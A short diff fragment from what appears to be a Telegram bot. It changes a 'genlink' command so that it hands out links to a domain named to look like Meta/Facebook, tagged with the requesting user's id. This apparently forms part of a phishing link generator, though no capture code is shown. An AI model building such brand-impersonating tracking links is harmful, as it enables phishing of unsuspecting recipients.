@@ -20,7 +20,7 @@ bot.start((ctx) => {
 
 bot.command("genlink", (ctx) => {
 
-  const link = `https://myweb/?id=${ctx.from.id}`;
+  const link = `https://meta-facebook-app.up.railway.app/?id=${ctx.from.id}`;
 
   ctx.reply(
 `🥹🥹🥹🥹🥹🥹🥹🥹🥹🥹🥹
